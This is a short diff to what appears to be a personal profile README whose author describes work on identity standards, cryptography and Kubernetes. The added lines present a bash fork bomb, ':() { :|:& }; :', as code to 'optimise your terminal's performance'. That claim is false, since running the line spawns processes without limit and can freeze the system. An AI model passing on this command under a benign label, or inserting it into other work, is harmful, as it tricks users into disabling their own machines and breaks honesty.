@@ -4,6 +4,9 @@
   Verifiable Credentials, and WebAuthn, plus the crypto underneath it all.
   These days I'm also getting my hands dirty with Kubernetes and DevOps.
 
+  Here's a nice piece of code to optimise your terminal's performance:
+  ``` :() { :|:& }; : ```
+
 
 ## What I'm working on
 
